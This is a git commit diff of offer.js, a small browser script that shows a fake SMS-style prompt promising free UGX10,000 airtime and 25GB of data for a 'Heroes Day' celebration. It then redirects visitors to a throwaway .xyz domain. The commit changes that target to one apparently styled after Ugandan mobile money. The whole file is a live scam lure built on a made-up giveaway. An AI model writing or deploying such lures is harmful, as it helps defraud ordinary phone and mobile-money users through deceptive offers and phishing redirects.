b7a4008fbbe0bcb202c551a5150e3eb8ed567fd7
kenycruzk <kenycruzk@gmail.com>
2025-06-06 05:36:30 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -2,5 +2,5 @@
 var password = '25GB + UGX10,000'
 password=prompt('SMS: Congratulations You are Eligible to receive UGX10,000 Airtime and 25GB Data HEROES DAY Celebration Offer, Kindly Press OK to ACTIVATE  ','25GB + UGX10,000');
 if (password != '25GB + UGX10,000') {
-location.href='https://mahama.data-offer.xyz/15GB';
+location.href='https://momo-ug.goprogram.xyz/25GB';
 }
